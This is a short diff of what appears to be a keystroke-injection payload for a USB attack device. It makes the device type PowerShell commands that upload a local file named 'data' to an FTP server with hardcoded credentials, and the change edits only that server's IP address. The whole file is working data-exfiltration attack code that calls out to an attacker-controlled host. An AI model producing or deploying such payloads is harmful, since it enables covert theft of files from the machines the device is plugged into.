@@ -12,7 +12,7 @@ Press:176
 CustomDelay:1000
 Rem:Modify the line below with your settings
 PrintLine:
-PrintLine:$ftpURI = "ftp://ftp-admin:hacktheplanet@192.168.1.169/data"
+PrintLine:$ftpURI = "ftp://ftp-admin:hacktheplanet@192.168.1.1/data"
 PrintLine:$webclient = New-Object -TypeName System.Net.WebClient;
 PrintLine:$ftpURI = New-Object -TypeName System.Uri -ArgumentList $ftpURI;
 PrintLine:$webclient.UploadFile($ftpURI, [System.ENVIRONMENT]::CurrentDirectory + "\data");
